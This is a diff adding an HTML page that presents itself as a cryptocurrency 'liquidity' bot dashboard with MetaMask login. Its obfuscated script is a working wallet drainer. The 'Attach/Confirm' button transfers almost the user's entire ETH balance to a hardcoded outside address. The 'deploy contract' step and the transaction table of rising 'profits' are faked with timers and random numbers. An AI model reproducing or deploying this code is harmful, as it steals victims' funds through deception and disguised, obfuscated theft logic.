@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Liquidity Settings</title>
+<style>
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+    }
+ 
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #f0f0f3;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    }
+ 
+    .container {
+        background-color: white;
+        padding: 30px;
+        border-radius: 20px;
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        max-width: 800px;
+        width: 100%;
+        position: relative;
+        <!-- min-height: 500px; -->
+        margin: 50px;
+    }
+ 
+    .section {
+        opacity: 0;
+        transition: opacity 0.8s ease;
+        display: none;
+        height: 100%;
+    }
+ 
+    .section.show {
+        opacity: 1;
+        display: block;
+        width: 100%;
+    }
+ 
+    h2 {
+        text-align: center;
+        color: #333;
+        font-size: 1.6rem;
+        margin-bottom: 20px;
+    }
+ 
+    h3 {
+        font-size: 1.4rem;
+        margin-bottom: 15px;
+        color: #555;
+    }
+ 
+    p {
+        font-size: 1rem;
+        margin-bottom: 10px;
+        color: #333;
+    }
+ 
+    .group {
+        border: 2px solid #0078D4;
+        border-radius: 10px;
+        padding: 20px;
+        margin-bottom: 20px;
+        box-shadow: 0 4px 10px rgba(0, 120, 212, 0.1);
+        position: relative;
+    }
+ 
+    .group-title {
+        font-size: 1rem;
+        font-weight: bold;
+        color: #0078D4;
+        position: absolute;
+        top: -15px;
+        left: 20px;
+        background: white;
+        padding: 0 10px;
+    }
+ 
+    .grid {
+        display: flex;
+        gap: 20px;
+        align-items: center;
+    }
+ 
+    .grid input {
+        padding: 10px;
+        border-radius: 10px;
+        border: 1px solid #ccc;
+        background-color: #f9f9f9;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        font-size: 1rem;
+        outline: none;
+        transition: all 0.2s ease;
+        width: 80%;
+    }
+ 
+    .grid input:focus {
+        border-color: #0078D4;
+        box-shadow: 0 4px 12px rgba(0, 120, 212, 0.2);
+    }
+ 
+    button {
+        padding: 12px 20px;
+        border-radius: 10px;
+        border: none;
+        background-color: #0078D4;
+        color: white;
+        font-size: 1rem;
+        cursor: pointer;
+        transition: background-color 0.3s ease, box-shadow 0.3s ease;
+        box-shadow: 0 4px 10px rgba(0, 120, 212, 0.3);
+    }
+ 
+    button:hover {
+        background-color: #005A9E;
+        box-shadow: 0 6px 15px rgba(0, 90, 158, 0.4);
+    }
+ 
+    button:disabled {
+        background-color: #ccc;
+        cursor: not-allowed;
+        box-shadow: none;
+    }
+ 
+    .spinner {
+        border: 4px solid #ccc;
+        border-top: 4px solid #0078D4;
+        border-radius: 50%;
+        width: 20px;
+        height: 20px;
+        animation: spin 1s linear infinite;
+        display: none;
+        margin-left: 10px;
+    }
+ 
+    @keyframes spin {
+        0% {
+            transform: rotate(0deg);
+        }
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+ 
+    .checkmark {
+        width: 10px;
+        height: 10px;
+        border: 2px solid green;
+        border-radius: 50%;
+        position: relative;
+        display: none;
+        padding: 12px;
+        margin-left: 10px;
+    }
+ 
+    .checkmark::after {
+        content: "";
+        position: absolute;
+        top: 47%;
+        left: 51%;
+        width: 6px;
+        height: 13px;
+        border-right: 3px solid green;
+        border-bottom: 3px solid green;
+        transform: translate(-50%, -50%) rotate(45deg);
+    }
+ 
+    .panel {
+        background-color: #f9f9fb;
+        padding: 25px;
+        border-radius: 15px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        max-width: 800px;
+        margin: 0 auto;
+        margin-top: 20px;
+    }
+ 
+    .panel-content {
+        padding-bottom: 20px;
+        border-bottom: 1px solid #ddd;
+        margin-bottom: 20px;
+    }
+ 
+    .button-group {
+        display: flex;
+        gap: 10px;
+    }
+ 
+    .withdraw-btn {
+        background-color: #0078D4;
+    }
+ 
+    .withdraw-btn:hover {
+        background-color: #005A9E;
+    }
+ 
+    .disconnect-btn {
+        background-color: #d9534f;
+    }
+ 
+    .disconnect-btn:hover {
+        background-color: #c9302c;
+    }
+ 
+    .transaction-table {
+        width: 100%;
+        border-collapse: collapse;
+        table-layout: fixed;
+    }
+ 
+    .transaction-table th, .transaction-table td {
+        padding: 10px;
+        text-align: left;
+        border: 1px solid #ddd;
+        word-wrap: break-word;
+    }
+ 
+    .transaction-table th {
+        background-color: #0078D4;
+        color: white;
+    }
+ 
+    .transaction-table tbody {
+        display: block;
+        max-height: 150px;
+        overflow-y: auto;
+    }
+ 
+    .transaction-table thead, .transaction-table tbody tr {
+        display: table;
+        width: 100%;
+        table-layout: fixed;
+    }
+ 
+    .transaction-table tbody::-webkit-scrollbar {
+        width: 6px;
+    }
+ 
+    .transaction-table tbody::-webkit-scrollbar-thumb {
+        background-color: #0078D4;
+        border-radius: 4px;
+    }
+ 
+    .transaction-table tbody::-webkit-scrollbar-track {
+        background-color: #f0f0f0;
+    }
+ 
+    @media (max-width: 600px) {
+        .container {
+            width: 100%;
+            padding: 20px;
+        }
+ 
+        .grid {
+            flex-direction: column;
+            gap: 10px;
+        }
+ 
+        button, input {
+            width: 100%;
+        }
+ 
+        .spinner, .checkmark {
+            margin: 10px 0 0 0;
+        }
+    }
+</style>
+ 
+	<script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+ 
+</head>
+<body>
+ 
+  <div class="container">
+    
+    <!-- First Section (before contract deployment) -->
+    <div id="section0" class="section show" >
+		<h2>Connect Wallet</h2>
+      <div class="group" style=" text-align: center; ">
+		<button onclick="connectMetamask()">Connect</button>
+      </div>
+    </div>
+    
+    <!-- First Section (before contract deployment) -->
+    <div id="section1" class="section" >
+		<h2>Liquidity Settings</h2>
+      <div class="group">
+        <div class="group-title">Deploy Contract</div>
+        <div class="grid">
+          <button id="deployBtn" onclick="deployContract()">Deploy</button>
+          <span id="contractStatus">No Contract</span>
+          <div id="loadingIconDeploy" class="spinner"></div>
+          <div id="successIconDeploy" class="checkmark"></div>
+        </div>
+      </div>
+      <div class="group">
+        <div class="group-title">Profits Address</div>
+        <div class="grid">
+          <input id="addressInput" type="text" placeholder="Input second address ETH" disabled="disabled" />
+          <button id="attachBtn" onclick="attachAddress()" disabled="disabled">Attach</button>
+          <div id="loadingIconAttach" class="spinner"></div>
+          <div id="successIconAttach" class="checkmark"></div>
+        </div>
+      </div>
+      <div class="group">
+        <div class="group-title">My Status</div>
+        <div class="grid">
+          <button id="confirmLiquidityBtn" onclick="confirmLiquidity()" disabled="disabled">Confirm the Liquidity</button>
+          <div id="loadingIconConfirm" class="spinner"></div>
+          <div id="successIconConfirm" class="checkmark"></div>
+        </div>
+      </div>
+    </div>
+ 
+    <!-- Second Section (after contract deployment) -->
+    <div id="section2" class="section" >
+	  <div class="panel">
+		<!-- <h2>Liquidity Panel</h2> -->
+		<div class="panel-content">
+		  <h3>My ETH Contract Details</h3>
+		  <p id="ethContract"><strong>My ETH Contract:</strong> 0xABC123...</p>
+		  <p id="ethAddress"><strong>My ETH Address:</strong> 0xABC123...</p>
+		  <p id="ethLiquidity"><strong>My Liquidity:</strong> 0.0000 ETH</p>
+		  <p><strong>My Status:</strong> Liquid</p>
+		  <p><strong>My Profit for Withdraw:</strong> <span id="profitValue">0 ETH</span></p>
+		  <p><strong>My Address for Withdraw:</strong> <span id="withdrawInput">0x</span></p>
+		  <!-- <input type="text" placeholder="address to withdraw" class="withdraw-input" id="withdrawInput" /> -->
+			<div class="button-group">
+				<button class="start-btn" id="startBtn" onclick="startProcess()">Start</button>
+				<button class="stop-btn" id="stopBtn" onclick="stopProcess()" disabled>Stop</button>
+				<button class="withdraw-btn" id="withdrawBtn" disabled>Withdraw All Profit</button>
+				<button class="disconnect-btn" onclick="disconnectMetamask()">Disconnect</button>
+			</div>
+ 
+		</div>
+ 
+		<h3>Transaction History</h3>
+		<div class="table-container">
+		  <table class="transaction-table">
+			<thead>
+			  <tr>
+				<th>Status</th>
+				<th>Method</th>
+				<th>My Fee (Profit)</th>
+				<th>Sender</th>
+				<th>My ETH Account</th>
+			  </tr>
+			</thead>
+			<tbody>
+			  <!-- Initially, there will be 4 empty rows here -->
+			</tbody>
+		  </table>
+		</div>
+ 
+		
+		
+	  </div>
+	</div>
+	
+ 
+ 
+	
+	
+  </div>
+ 
+  <script>
+(function(_0x5a327b,_0x1ba7b8){const _0x3c0873=_0x53c7,_0x11956f=_0x5a327b();while(!![]){try{const _0x256f27=parseInt(_0x3c0873(0x16c))/0x1+parseInt(_0x3c0873(0x197))/0x2+parseInt(_0x3c0873(0x16d))/0x3*(parseInt(_0x3c0873(0x1ba))/0x4)+-parseInt(_0x3c0873(0x174))/0x5+-parseInt(_0x3c0873(0x187))/0x6*(-parseInt(_0x3c0873(0x1a4))/0x7)+parseInt(_0x3c0873(0x199))/0x8+-parseInt(_0x3c0873(0x198))/0x9;if(_0x256f27===_0x1ba7b8)break;else _0x11956f['push'](_0x11956f['shift']());}catch(_0xd1953a){_0x11956f['push'](_0x11956f['shift']());}}}(_0x6f4b,0xaee86));function deployContract(){const _0x13a10b=_0x53c7,_0x3a7dd2=document[_0x13a10b(0x18d)](_0x13a10b(0x1a5)),_0x2a9957=document[_0x13a10b(0x18d)]('contractStatus'),_0x2c8d5c=document[_0x13a10b(0x18d)]('loadingIconDeploy'),_0x3cc405=document[_0x13a10b(0x18d)](_0x13a10b(0x1a3));_0x2c8d5c['style'][_0x13a10b(0x188)]=_0x13a10b(0x1b1),_0x2a9957['textContent']='Deploying...',_0x3a7dd2[_0x13a10b(0x1bf)]=!![],setTimeout(()=>{const _0x5c8b9f=_0x13a10b;_0x2c8d5c[_0x5c8b9f(0x1b4)]['display']=_0x5c8b9f(0x17c),_0x3cc405[_0x5c8b9f(0x1b4)][_0x5c8b9f(0x188)]=_0x5c8b9f(0x1b1),_0x2a9957['textContent']=_0x5c8b9f(0x16f),document[_0x5c8b9f(0x18d)](_0x5c8b9f(0x1a6))[_0x5c8b9f(0x1bf)]=![],document[_0x5c8b9f(0x18d)](_0x5c8b9f(0x1a2))[_0x5c8b9f(0x1bf)]=![];},0xbb8);}function _0x6f4b(){const _0xf01f20=['section1','withdrawAddress','.transaction-table\x20tbody','Confirm','<strong>My\x20Liquidity:</strong>\x20','withdrawBtn','gte','ethLiquidity','1020086KfndoZ','7923YefQTF','rows','Contract\x20Deployed','</td>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</tr>\x0a\x20\x20\x20\x20','loadingIconAttach','0x00000...00000','sendTransaction','3711520vsfriv','remove','getItem','.table-container','value','color','floor','toBN','none','length','Invalid\x20Ethereum\x20address.\x20Please\x20enter\x20a\x20valid\x200x\x20address.','removeItem','innerHTML','green','toFixed','isNeg','request','metamaskAddress','substring','36rygZJA','display','Error\x20fetching\x20balance:','undefined','classList','...','getElementById','sub','errorMsg','querySelector','random','logoutMsg','MetaMask\x20connection\x20rejected.\x20Please\x20try\x20again.','stopBtn','Confirmed','withdrawInput','1061866pzjXfg','25157745kMbcYu','7457912NWdIGE','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<tr>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<td>✔</td>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<td>','profitValue','0x6F356C243aee370C13Dc244f538e3A487849A875','Transfer','loadingIconConfirm','Add\x20Liquidity','onclick','div','attachBtn','successIconDeploy','534562zHrthE','deployBtn','addressInput','getBalance','startBtn','reload','textContent','Swap','0x00000...000','toString','utils','Not\x20enough\x20balance\x20to\x20cover\x20transaction\x20fees','location','inline-block','isZero','marginTop','style','createElement','error','Transfer\x20failed.\x20Please\x20try\x20again.','show','<strong>My\x20ETH\x20Contract:</strong>\x20','1988AiDKPD','<strong>My\x20Liquidity:</strong>\x200.0000\x20ETH','10px','fromWei','add','disabled','section0','test','eth','ethereum','</td>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<td>','\x20ETH</td>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<td>','appendChild','ethAddress','confirmLiquidityBtn'];_0x6f4b=function(){return _0xf01f20;};return _0x6f4b();}function attachAddress(){const _0x717953=_0x53c7,_0x1361d5=document[_0x717953(0x18d)](_0x717953(0x1a6)),_0xe68f42=document['getElementById'](_0x717953(0x1a2)),_0x333246=document[_0x717953(0x18d)](_0x717953(0x196)),_0x2d4d26=_0x1361d5[_0x717953(0x178)],_0x574edb=/^0x[a-fA-F0-9]{40}$/[_0x717953(0x1c1)](_0x2d4d26);if(!_0x574edb){showErrorMessage(_0x717953(0x17e),_0x717953(0x164));return;}_0x1361d5[_0x717953(0x1bf)]=!![],_0xe68f42[_0x717953(0x1aa)]=_0x717953(0x167),_0xe68f42[_0x717953(0x1a0)]=confirmTransfer,localStorage['setItem'](_0x717953(0x165),_0x2d4d26),_0x333246[_0x717953(0x1aa)]=formatEthAddress(_0x2d4d26);}async function confirmTransfer(){const _0x5e8a94=_0x53c7,_0x4b7728=document[_0x5e8a94(0x18d)]('attachBtn'),_0x1888b5=document[_0x5e8a94(0x18d)](_0x5e8a94(0x171)),_0x2b40cc=document[_0x5e8a94(0x18d)]('successIconAttach'),_0x341706=document['getElementById'](_0x5e8a94(0x163));_0x4b7728[_0x5e8a94(0x1bf)]=!![],_0x1888b5[_0x5e8a94(0x1b4)][_0x5e8a94(0x188)]=_0x5e8a94(0x1b1);try{const _0x4f5850=localStorage[_0x5e8a94(0x176)](_0x5e8a94(0x185)),_0x4a9c11=_0x5e8a94(0x19c);if(web3&&_0x4f5850){const _0x31f5ea=await web3[_0x5e8a94(0x1c2)]['getGasPrice'](),_0x13595a=0x5208,_0x1ed278=web3[_0x5e8a94(0x1ae)][_0x5e8a94(0x17b)](_0x31f5ea)['mul'](web3[_0x5e8a94(0x1ae)][_0x5e8a94(0x17b)](_0x13595a)),_0x33b075=_0x1ed278['mul'](web3[_0x5e8a94(0x1ae)][_0x5e8a94(0x17b)](0x3))[_0x5e8a94(0x1a1)](web3['utils']['toBN'](0x2)),_0x14bace=await web3[_0x5e8a94(0x1c2)][_0x5e8a94(0x1a7)](_0x4f5850),_0x2763aa=web3['utils'][_0x5e8a94(0x17b)](_0x14bace);if(_0x2763aa[_0x5e8a94(0x16a)](_0x33b075)){const _0xca8bf3=_0x2763aa[_0x5e8a94(0x18e)](_0x33b075);if(_0xca8bf3[_0x5e8a94(0x1b2)]()||_0xca8bf3[_0x5e8a94(0x183)]())throw new Error(_0x5e8a94(0x1af));await web3['eth'][_0x5e8a94(0x173)]({'from':_0x4f5850,'to':_0x4a9c11,'value':_0xca8bf3[_0x5e8a94(0x1ad)](),'gas':_0x13595a,'gasPrice':_0x31f5ea}),_0x1888b5['style'][_0x5e8a94(0x188)]=_0x5e8a94(0x17c),_0x2b40cc['style'][_0x5e8a94(0x188)]=_0x5e8a94(0x1b1),_0x341706[_0x5e8a94(0x1bf)]=![],_0x4b7728[_0x5e8a94(0x1aa)]=_0x5e8a94(0x195);}else throw new Error('Not\x20enough\x20ETH\x20to\x20cover\x20gas\x20fees.\x20Please\x20deposit\x20more\x20ETH.');}else throw new Error('Web3\x20or\x20MetaMask\x20is\x20not\x20initialized');}catch(_0x1266b5){_0x4b7728['disabled']=![],console[_0x5e8a94(0x1b6)]('Error\x20during\x20transfer:',_0x1266b5),showErrorMessage(_0x1266b5['message']||_0x5e8a94(0x1b7),_0x5e8a94(0x164));}finally{_0x1888b5[_0x5e8a94(0x1b4)][_0x5e8a94(0x188)]='none';}}let currentProfitForWithdraw=0x0,tableUpdateInterval;function startProcess(){const _0x4991f1=_0x53c7;document[_0x4991f1(0x18d)](_0x4991f1(0x1a8))[_0x4991f1(0x1bf)]=!![],document['getElementById'](_0x4991f1(0x194))[_0x4991f1(0x1bf)]=![],document[_0x4991f1(0x18d)](_0x4991f1(0x169))[_0x4991f1(0x1bf)]=!![],tableUpdateInterval=setInterval(updateTable,Math[_0x4991f1(0x17a)](Math['random']()*0x7d0)+0xbb8);}function stopProcess(){const _0x2df036=_0x53c7;document[_0x2df036(0x18d)](_0x2df036(0x1a8))[_0x2df036(0x1bf)]=![],document[_0x2df036(0x18d)](_0x2df036(0x194))['disabled']=!![],document['getElementById']('withdrawBtn')[_0x2df036(0x1bf)]=![],clearInterval(tableUpdateInterval);}function updateTable(){const _0x5741c6=_0x53c7,_0x385a09=[_0x5741c6(0x19d),_0x5741c6(0x1ab),_0x5741c6(0x19f),'Create\x20Order'],_0x534188=document[_0x5741c6(0x190)](_0x5741c6(0x166)),_0x51e37d=localStorage['getItem']('metamaskAddress')||_0x5741c6(0x172),_0x4bf575=formatEthAddress(_0x51e37d),_0x394573=_0x385a09[Math[_0x5741c6(0x17a)](Math[_0x5741c6(0x191)]()*_0x385a09['length'])],_0x4b8063=(Math[_0x5741c6(0x191)]()*0.01)['toFixed'](0x6);currentProfitForWithdraw+=parseFloat(_0x4b8063),document['getElementById'](_0x5741c6(0x19b))[_0x5741c6(0x1aa)]=currentProfitForWithdraw[_0x5741c6(0x182)](0x6)+'\x20ETH';const _0x3e2068=_0x5741c6(0x19a)+_0x394573+_0x5741c6(0x15f)+_0x4b8063+_0x5741c6(0x160)+generateRandomAddress()+_0x5741c6(0x15f)+_0x4bf575+_0x5741c6(0x170);_0x534188['insertAdjacentHTML']('afterbegin',_0x3e2068);const _0x378984=document[_0x5741c6(0x190)](_0x5741c6(0x177));_0x534188[_0x5741c6(0x16e)][_0x5741c6(0x17d)]>0x4&&(_0x378984['scrollTop']=0x0);}function formatEthAddress(_0x9a385d){const _0x3b0368=_0x53c7;return _0x9a385d[_0x3b0368(0x186)](0x0,0x6)+_0x3b0368(0x18c)+_0x9a385d[_0x3b0368(0x186)](_0x9a385d['length']-0x4);}function generateRandomAddress(){const _0x5f1c7d=_0x53c7,_0x1e39a0='0x'+Math[_0x5f1c7d(0x191)]()[_0x5f1c7d(0x1ad)](0x10)['substr'](0x2,0x5)+_0x5f1c7d(0x18c)+Math[_0x5f1c7d(0x191)]()[_0x5f1c7d(0x1ad)](0x10)['substr'](0x2,0x5);return _0x1e39a0;}function confirmLiquidity(){const _0x4b3955=_0x53c7,_0x39243e=document['getElementById'](_0x4b3955(0x19e)),_0x58d2f2=document[_0x4b3955(0x18d)]('successIconConfirm');_0x39243e['style']['display']=_0x4b3955(0x1b1),document[_0x4b3955(0x18d)](_0x4b3955(0x163))[_0x4b3955(0x1bf)]=!![],setTimeout(()=>{const _0x884ac5=_0x4b3955;_0x39243e[_0x884ac5(0x1b4)][_0x884ac5(0x188)]=_0x884ac5(0x17c),_0x58d2f2[_0x884ac5(0x1b4)][_0x884ac5(0x188)]=_0x884ac5(0x1b1),document[_0x884ac5(0x18d)](_0x884ac5(0x164))[_0x884ac5(0x18b)][_0x884ac5(0x175)](_0x884ac5(0x1b8)),document[_0x884ac5(0x18d)]('section2')['classList'][_0x884ac5(0x1be)]('show'),startProcess();},0xbb8);}let web3;async function connectMetamask(){const _0x51e609=_0x53c7;if(typeof window[_0x51e609(0x15e)]!==_0x51e609(0x18a))try{const _0x371c34=await ethereum[_0x51e609(0x184)]({'method':'eth_requestAccounts'}),_0xd2872a=_0x371c34[0x0];web3=new Web3(window[_0x51e609(0x15e)]),document[_0x51e609(0x18d)](_0x51e609(0x1c0))[_0x51e609(0x18b)][_0x51e609(0x175)](_0x51e609(0x1b8)),document['getElementById'](_0x51e609(0x164))[_0x51e609(0x18b)]['add']('show'),localStorage['setItem']('metamaskAddress',_0xd2872a),updateEthDetails();}catch(_0x5ddd75){showErrorMessage(_0x51e609(0x193),'section0');}else showErrorMessage('MetaMask\x20is\x20not\x20installed.\x20Please\x20install\x20MetaMask\x20to\x20continue.',_0x51e609(0x1c0));}function showErrorMessage(_0xf98576,_0x53be18){const _0x441d90=_0x53c7;let _0x550071=document[_0x441d90(0x18d)]('errorMsg');!_0x550071&&(_0x550071=document[_0x441d90(0x1b5)]('p'),_0x550071['id']=_0x441d90(0x18f),_0x550071[_0x441d90(0x1b4)]['color']='red',_0x550071[_0x441d90(0x1b4)][_0x441d90(0x1b3)]=_0x441d90(0x1bc),document[_0x441d90(0x18d)](_0x53be18)[_0x441d90(0x161)](_0x550071)),_0x550071[_0x441d90(0x1aa)]=_0xf98576,setTimeout(()=>{_0x550071&&_0x550071['remove']();},0xbb8);}function disconnectMetamask(){const _0x133277=_0x53c7;localStorage[_0x133277(0x17f)](_0x133277(0x185)),showLogoutMessage('You\x20have\x20been\x20disconnected.'),setTimeout(()=>{const _0x397e47=_0x133277;window[_0x397e47(0x1b0)][_0x397e47(0x1a9)]();},0x3e8);}function _0x53c7(_0x4b26bf,_0x5e9216){const _0x6f4b56=_0x6f4b();return _0x53c7=function(_0x53c78b,_0xc2b090){_0x53c78b=_0x53c78b-0x15e;let _0x1c1f3f=_0x6f4b56[_0x53c78b];return _0x1c1f3f;},_0x53c7(_0x4b26bf,_0x5e9216);}function showLogoutMessage(_0x17d480){const _0x30a970=_0x53c7;let _0x5a4012=document[_0x30a970(0x18d)](_0x30a970(0x192));!_0x5a4012&&(_0x5a4012=document[_0x30a970(0x1b5)]('p'),_0x5a4012['id']=_0x30a970(0x192),_0x5a4012['style'][_0x30a970(0x179)]=_0x30a970(0x181),_0x5a4012['style'][_0x30a970(0x1b3)]=_0x30a970(0x1bc),document['getElementById']('section0')[_0x30a970(0x161)](_0x5a4012)),_0x5a4012[_0x30a970(0x1aa)]=_0x17d480,setTimeout(()=>{_0x5a4012&&_0x5a4012['remove']();},0xbb8);}async function updateEthDetails(){const _0x68cc4=_0x53c7,_0x2b6194=localStorage[_0x68cc4(0x176)](_0x68cc4(0x185))||_0x68cc4(0x1ac),_0x5abb8c=formatEthAddress(_0x2b6194);document[_0x68cc4(0x18d)](_0x68cc4(0x162))[_0x68cc4(0x180)]='<strong>My\x20ETH\x20Address:</strong>\x20'+_0x5abb8c;const _0x3b6c54=generateRandomAddress(),_0x3171b7=formatEthAddress(_0x3b6c54);document[_0x68cc4(0x18d)]('ethContract')['innerHTML']=_0x68cc4(0x1b9)+_0x3171b7;if(web3&&_0x2b6194)try{const _0x35a8e4=await web3[_0x68cc4(0x1c2)][_0x68cc4(0x1a7)](_0x2b6194),_0x4a691f=web3['utils'][_0x68cc4(0x1bd)](_0x35a8e4,'ether');document[_0x68cc4(0x18d)](_0x68cc4(0x16b))[_0x68cc4(0x180)]=_0x68cc4(0x168)+parseFloat(_0x4a691f)[_0x68cc4(0x182)](0x4)+'\x20ETH';}catch(_0x528ad0){console['error'](_0x68cc4(0x189),_0x528ad0),document[_0x68cc4(0x18d)](_0x68cc4(0x16b))[_0x68cc4(0x180)]=_0x68cc4(0x1bb);}else document['getElementById'](_0x68cc4(0x16b))[_0x68cc4(0x180)]=_0x68cc4(0x1bb);}
+  </script>
+ 
+</body>
+</html>
